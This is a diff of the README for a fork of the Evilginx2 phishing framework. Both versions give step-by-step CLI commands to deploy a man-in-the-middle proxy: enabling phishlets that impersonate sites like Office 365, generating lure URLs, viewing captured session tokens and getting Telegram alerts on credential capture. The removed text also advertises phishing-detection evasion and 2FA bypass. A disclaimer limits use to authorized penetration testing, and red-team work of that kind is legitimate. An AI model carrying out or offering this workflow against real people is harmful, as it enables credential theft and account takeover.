@@ -1,177 +1,138 @@
-<p align="center">
-  <img alt="Evilginx2 Logo" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/evilginx2-logo-512.png" height="160" />
-  <p align="center">
-    <img alt="Evilginx2 Title" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/evilginx2-title-black-512.png" height="60" />
-  </p>
-</p>
-
 # BenevolentGinx2 (Enhanced Community Edition)
 
-This repository is a community-enhanced fork of [kgretzky/evilginx2](https://github.com/kgretzky/evilginx2). It adds QoL features (REST API, Botguard, notifications, obfuscation, website spoofing, AES-256 encryption, multi-domain support, named proxy profiles) while remaining fully open source. **Original work by Kuba Gretzky; this project is released under the same [BSD-3-Clause license](LICENSE).**
+Community-enhanced fork of [kgretzky/evilginx2](https://github.com/kgretzky/evilginx2). Adds REST API, Botguard, notifications, obfuscation, website spoofing, AES-256 encryption, multi-domain support, and named proxy profiles. **Original work by Kuba Gretzky. This project is released under the same [BSD-3-Clause license](LICENSE).**
 
-## How to Use BenevolentGinx2
+---
 
-Use only for authorized testing. This guide walks you through running the tool and generating your first phishing link.
+## Setup on Debian
 
-### 1. Prerequisites
-
-- **Server** with a public IP (VPS or cloud instance).
-- **Domain name** you control (e.g. `yourdomain.com`).
-- **DNS**: Ability to add A records (and optionally NS for a subdomain) pointing to your server IP.
-- **Go 1.16+** (to build), or a pre-built binary.
-
-### 2. Build and Run
+Install dependencies and Go (1.16+ required):
 
 ```bash
-# Clone (or use your existing copy)
+sudo apt update
+sudo apt install -y git build-essential
+
+# Go: use system package on Debian 12, or install from go.dev on older releases
+sudo apt install -y golang-go
+go version   # must be 1.16 or newer
+
+# If golang-go is too old, install from https://go.dev/dl/ instead, e.g.:
+# wget https://go.dev/dl/go1.21.5.linux-amd64.tar.gz
+# sudo tar -C /usr/local -xzf go1.21.5.linux-amd64.tar.gz
+# echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc && source ~/.bashrc
+```
+
+---
+
+## Build and Run
+
+```bash
 git clone https://github.com/patrick-projects/BenevolentGinx2.git
 cd BenevolentGinx2
-
-# Build
 make build
-# Or: go build -o evilginx
-
-# Run (creates config in current directory)
 ./evilginx
 ```
 
-When it starts, you'll see the banner and an **Enhanced Edition** line with quick hints. Type `help` for commands.
+Type `help` at the prompt for commands.
 
-### 3. First-Time Configuration
+---
 
-At the `evilginx` prompt, set the basics:
+## Configuration and Usage
+
+Use only for authorized testing.
+
+### First-time config
 
 | Step | Command | Example |
 |------|--------|--------|
 | Base domain | `config domain <domain>` | `config domain yourdomain.com` |
 | Server IP | `config ipv4 external <ip>` | `config ipv4 external 203.0.113.10` |
-| Redirect for unauthorized visitors | `config unauth_url <url>` | `config unauth_url https://google.com` |
+| Unauthorized redirect | `config unauth_url <url>` | `config unauth_url https://example.com` |
 
-**DNS:** Create an A record so your phishing hostnames resolve to your server (e.g. `login.yourdomain.com` → your server IP). You can also use a subdomain and point NS to your server if using the built-in DNS.
-
-**Certificates:** With a real domain and port 80/443 open, enable Let's Encrypt:
+Point DNS A records for your hostnames to this server. Then:
 
 ```
 config autocert on
+config
 ```
 
-Check settings with `config`.
+### Phishlets
 
-### 4. Phishlets: Pick One and Enable It
-
-**Phishlets** define which site you're imitating (e.g. Microsoft, Google). The repo does not ship third-party phishlets; add `.yaml` phishlet files to the `phishlets/` directory (create it if needed), then in the CLI:
+Add `.yaml` phishlet files to the `phishlets/` directory. Then:
 
 ```
 phishlets
-phishlets hostname <name> <host>    # e.g. phishlets hostname o365 login.yourdomain.com
+phishlets hostname <name> <host>   # e.g. phishlets hostname o365 login.yourdomain.com
 phishlets enable <name>
 phishlets
 ```
 
-Fix any certificate or hostname errors shown in the status.
-
-### 5. Create a Lure and Get a Phishing URL
-
-A **lure** is a specific landing path you'll send to targets.
+### Lures and phishing URL
 
 ```
 lures create <phishlet>
 lures
-lures get-url <id>    # use the id from lures (e.g. 0)
+lures get-url <id>
 ```
 
-Use the generated URL in your campaign. When someone opens it and signs in, the session is captured.
-
-### 6. View Captured Sessions
+### Sessions
 
 ```
 sessions
-sessions <id>    # tokens and details for one session
+sessions <id>
 ```
 
-### 7. Optional: Notifications (e.g. Telegram)
-
-Real-time alerts when someone clicks a lure or submits credentials:
+### Optional: Telegram notifications
 
 ```
 notify create mybot telegram
-notify set mybot bot_token <YOUR_BOT_TOKEN>
-notify set mybot chat_id <YOUR_CHAT_ID>
+notify set mybot bot_token <TOKEN>
+notify set mybot chat_id <CHAT_ID>
 notify enable mybot
 notify test mybot
 ```
 
-- **Bot token:** Create a bot with [@BotFather](https://t.me/BotFather).
-- **Chat ID:** Send a message to your bot, then open `https://api.telegram.org/bot<TOKEN>/getUpdates` and read `chat.id`.
+Token from [@BotFather](https://t.me/BotFather). Chat ID from `https://api.telegram.org/bot<TOKEN>/getUpdates` after messaging your bot.
 
-More: `help notify`.
-
-### 8. Optional: REST API
+### Optional: REST API
 
 ```
-api key <your-secret-key>
-api secret_path /your-secret-path
+api key <secret>
+api secret_path <path>
 api enable
 ```
 
-Then call e.g. `https://yourdomain.com/your-secret-path/api/sessions` with header `X-Api-Key: <your-secret-key>`. More: `help api`.
+Call `https://yourdomain.com/<path>/api/sessions` with header `X-Api-Key: <secret>`. See `help api`.
 
-### 9. Optional: Bot Detection (Botguard)
+### Optional: Botguard
 
 ```
 botguard enable
-botguard js_challenge on    # optional "Verifying browser..." step for first-time visitors
+botguard js_challenge on
 ```
 
-More: `help botguard`.
-
-### 10. Quick Reference
+### Quick reference
 
 | Goal | Command |
 |------|--------|
-| See all config | `config` |
-| List phishlets | `phishlets` |
-| Set hostname & enable | `phishlets hostname <name> <host>` then `phishlets enable <name>` |
-| List lures | `lures` |
-| Create lure | `lures create <phishlet>` |
-| Get phishing URL | `lures get-url <id>` |
-| View sessions | `sessions` |
-| In-app help | `help`, `help <command>` |
+| Config | `config` |
+| Phishlets | `phishlets` · `phishlets hostname <name> <host>` · `phishlets enable <name>` |
+| Lures | `lures` · `lures create <phishlet>` · `lures get-url <id>` |
+| Sessions | `sessions` · `sessions <id>` |
+| Help | `help` · `help <command>` |
 
-**More information:** [help.evilginx.com](https://help.evilginx.com) (concepts, phishlets). Phishlets are not included in this repo; obtain from community or official sources and place in `phishlets/`.
+Phishlets are not included; obtain from community or official sources and place in `phishlets/`. More: [help.evilginx.com](https://help.evilginx.com).
 
 ---
 
-# Evilginx 3.0 (base)
-
-**Evilginx** is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows to bypass 2-factor authentication protection.
-
-This tool is a successor to [Evilginx](https://github.com/kgretzky/evilginx), released in 2017, which used a custom version of nginx HTTP server to provide man-in-the-middle functionality to act as a proxy between a browser and phished website.
-Present version is fully written in GO as a standalone application, which implements its own HTTP and DNS server, making it extremely easy to set up and use.
-
-<p align="center">
-  <img alt="Screenshot" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/screen.png" height="320" />
-</p>
-
 ## Disclaimer
 
-I am very much aware that Evilginx can be used for nefarious purposes. This work is merely a demonstration of what adept attackers can do. It is the defender's responsibility to take such attacks into consideration and find ways to protect their users against this type of phishing attacks. Evilginx should be used only in legitimate penetration testing assignments with written permission from to-be-phished parties.
+Evilginx can be used for nefarious purposes. This work is a demonstration of what attackers can do. Use only for legitimate penetration testing with written permission from the to-be-phished parties.
 
-
-### Key features:
-
-- Out-of-the-box **phishing detection evasion** (including Chrome's Enchanced Browser Protection)
-- Tested and maintained **official phishlets database**
-- **Botguard** to **prevent bot traffic** by default (same concept as Cloudflare Turnstile)
-- **Evilpuppet** for advanced phishing capability (Google)
-- External **DNS providers** with multi-domain support
-- **Website spoofing** for unauthorized requests
-- **JavaScript** & **HTML obfuscation**
-- **Wildcard TLS certificates**
-- **Automated** server deployment
-- **SQLite** database support
-
+---
 
 ## License
 
-**evilginx2** is made by Kuba Gretzky ([@mrgretzky](https://twitter.com/mrgretzky)) and it's released under BSD-3 license.
+Copyright (c) 2018-2023 Kuba Gretzky. All rights reserved.  
+Redistribution and use in source and binary forms, with or without modification, are permitted under the terms of the [BSD-3-Clause license](LICENSE).  
+**evilginx2** is made by Kuba Gretzky ([@mrgretzky](https://twitter.com/mrgretzky)). This fork retains the same license.
